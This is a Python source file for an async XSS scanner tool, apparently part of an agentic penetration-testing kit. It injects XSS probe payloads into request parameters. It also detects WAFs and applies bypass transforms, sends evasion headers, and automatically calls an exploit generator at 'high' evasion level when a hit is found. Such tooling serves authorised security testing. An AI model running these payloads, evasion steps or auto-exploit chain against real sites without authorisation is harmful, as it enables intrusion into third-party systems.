import urllib.parse
import asyncio
from src.sdk.tool import function_tool
from .common import (
    XSS_PAYLOADS,
    XSS_PAYLOADS_ADVANCED,
    _detect_waf,
    _get_evasion_headers,
    _waf_transform_payloads,
    async_fetch_all,
    register_appsec_vulnerability,
)

# ─── XSS (Asynchronous Engine Upgrade) ────────────────────────────────────────────────

@function_tool()
async def xss_scanner(url: str, parameter: str = "", method: str = "GET", 
                cookies: str = "", custom_payloads: str = "",
                data_params: str = "", fetch_url: str = "") -> str:
    """
    Scan for Cross-Site Scripting (XSS) vulnerabilities (Async Engine).
    Tests multiple XSS payloads, context-aware encoding, and DOM/Stored flows.
    Automatically detects WAFs, applies bypass transforms, and registers findings.
    
    Args:
        url: Target submission URL (e.g., http://target.com/search?q=test)
        parameter: Specific parameter to test (if empty, tests all detected params in query/data)
        method: HTTP method (GET or POST)
        cookies: Optional cookies in format "name=value; name2=value2"
        custom_payloads: Custom payloads separated by semicolons
        data_params: POST body data (e.g. "param1=value1&param2=value2")
        fetch_url: If testing Stored XSS, fetch this URL after submission to check reflection
    
    Returns:
        XSS scan results with potential vulnerabilities
    """
    results = ["## XSS Scan Results (Async Engine)", f"Target: {url}"]
    payloads = XSS_PAYLOADS.copy()
    
    # Advanced Payloads for context-aware and CSP bypass
    advanced_payloads = [
        "\\'-alert(1)//", # Escaped script context
        "\" autofocus onfocus=alert(1) autofocus \"", # Attribute context
        "javascript:alert(1)", # href/src context
        "<script src=data:text/javascript,alert(1)></script>", # CSP bypass
        "<template><script>alert(1)</script></template>", # Dangling markup / template
    ]
    payloads.extend(advanced_payloads)

    # Include all advanced payload categories from the shared library
    for _cat_payloads in XSS_PAYLOADS_ADVANCED.values():
        payloads.extend(_cat_payloads)

    if custom_payloads:
        payloads.extend(custom_payloads.split(";"))
        
    # ── WAF Detection + Payload Enhancement ────────────────────────────────
    waf_vendor, waf_conf = _detect_waf(url)
    if waf_conf > 0.2:
        results.append(f"⚠ WAF Detected: {waf_vendor} (confidence: {int(waf_conf*100)}%)")
        results.append(f"  → Applying {waf_vendor}-specific bypass transforms to payloads\n")
    
    payloads = _waf_transform_payloads(payloads, "xss", url=url, waf_vendor=waf_vendor)
        
    parsed = urllib.parse.urlparse(url)
    get_params = dict(urllib.parse.parse_qsl(parsed.query))
    post_params = dict(urllib.parse.parse_qsl(data_params)) if data_params else {}
    
    # Determine parameters to test
    params_to_test = []
    if parameter:
        if parameter in get_params: params_to_test.append((parameter, "GET"))
        elif parameter in post_params: params_to_test.append((parameter, "POST"))
        else:
            if method.upper() == "POST": params_to_test.append((parameter, "POST"))
            else: params_to_test.append((parameter, "GET"))
    else:
        for k in get_params: params_to_test.append((k, "GET"))
        for k in post_params: params_to_test.append((k, "POST"))
        
    if not params_to_test:
        return "No parameters found to test. Provide URL params or data_params."
        
    results.append(f"Testing {len(params_to_test)} parameter(s) with {len(payloads)} payloads.")
    if fetch_url:
        results.append(f"Stored XSS Mode active: Reflected checks will be done on {fetch_url}")
    results.append("")
    
    headers = _get_evasion_headers({"Cookie": cookies} if cookies else None)
    
    # ── Request Formulation ────────────────────────────────────────────────
    results.append(f"🚀 Launching async swarm for XSS payloads...")
    
    async_requests = []
    
    for param, ptype in params_to_test:
        for payload in payloads[:25]: # Cap payloads per param to prevent memory issues
            test_get = get_params.copy()
            test_post = post_params.copy()
            
            if ptype == "GET": test_get[param] = payload
            if ptype == "POST": test_post[param] = payload
            
            req_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(test_get)))
            
            req = {
                "headers": headers,
                "_param": param,
                "_ptype": ptype,
                "_payload": payload
            }
            
            if method.upper() == "POST" or ptype == "POST":
                req["method"] = "POST"
                req["url"] = req_url
                req["data"] = test_post
            else:
                req["method"] = "GET"
                req["url"] = req_url
                
            async_requests.append(req)
            
    # ── Execution ──────────────────────────────────────────────────────────
    scan_results = await async_fetch_all(async_requests, max_concurrent=25, timeout_sec=10)
    
    # Handle Stored XSS fetch if necessary
    if fetch_url:
        results.append("⏳ Waiting 2 seconds for backend to sync Stored XSS...")
        await asyncio.sleep(2)
        fetch_req = {"method": "GET", "url": fetch_url, "headers": headers}
        fetch_res = (await async_fetch_all([fetch_req]))[0]
        stored_text = fetch_res["text"] if not fetch_res["error"] else ""
        
        # We manually map the payloads to the single fetched result
        for res in scan_results:
            if not res["error"]:
                res["text"] = stored_text
                
    vulnerable = []
    
    for res in scan_results:
        if res["error"]:
            continue
            
        req_meta = res["req"]
        param = req_meta["_param"]
        payload = req_meta["_payload"]
        
        response_text = res["text"]
        
        if payload in response_text or urllib.parse.quote(payload) in response_text:
            encoded_payload = payload.replace("<", "&lt;").replace(">", "&gt;")
            if encoded_payload not in response_text:
                # Context Analysis
                context = "HTML Body"
                if f'"{payload}"' in response_text or f"'{payload}'" in response_text:
                    context = "Attribute / Script String"
                
                vulnerable.append({
                    "parameter": param,
                    "type": "Stored XSS" if fetch_url else "Reflected XSS",
                    "context": context,
                    "payload": payload
                })
                results.append(f"  ⚠️ VULNERABLE: {payload[:50]}... (Context: {context})")
                
    # Deduplicate vulnerabilities by parameter to avoid spamming 20 payloads on the same param
    unique_vulns = {}
    for v in vulnerable:
        if v["parameter"] not in unique_vulns:
            unique_vulns[v["parameter"]] = v
            
    final_vulns = list(unique_vulns.values())
                
    results.append("\n## Summary")
    if final_vulns:
        results.append(f"🔴 Found {len(final_vulns)} potential XSS vulnerabilities!")
        
        for vuln in final_vulns:
            results.append(f"  - Parameter: {vuln['parameter']} ({vuln['type']})")
            results.append(f"    Context: {vuln['context']}")
            results.append(f"    Working Payload: {vuln['payload'][:60]}")
            
            await register_appsec_vulnerability(
                target_url=url,
                vuln_type=vuln['type'],
                severity="HIGH",
                parameter=vuln['parameter'],
                payload=vuln['payload'],
                evidence=f"Reflected in {vuln['context']}"
            )
            
        # ── Auto-Exploit Chaining ─────────────────────────────────────
        results.append("\n## Autonomous Exploit Generation")
        try:
            from src.tools.exploit_craft import generate_exploit_code
            
            context_str = f"Target URL: {url}\nMethod: {method}\n\nConfirmed Vulnerabilities:\n"
            for v in final_vulns[:2]:
                context_str += f"- Parameter '{v['parameter']}': {v['type']} (Context: {v['context']})\nWorking Payload: {v['payload']}\n"
            
            exploit_result = await generate_exploit_code.invoke(
                vuln_type="Cross-Site Scripting (XSS)",
                target_tech="Unknown Web Application",
                context=context_str,
                evasion_level="high",
                language="python"
            )
            
            results.append("✅ Auto-Exploit successfully generated and saved:")
            results.append("\n".join(exploit_result.split("\n")[:10]) + "\n...")
        except ImportError:
            results.append("⚠️ Exploit engine (exploit_craft) not available in this build.")
        except Exception as e:
            results.append(f"⚠️ Exploit generation failed: {str(e)[:100]}")
            
    else:
        results.append("✅ No obvious XSS vulnerabilities found (further manual/DOM testing recommended)")
        
    return "\n".join(results)
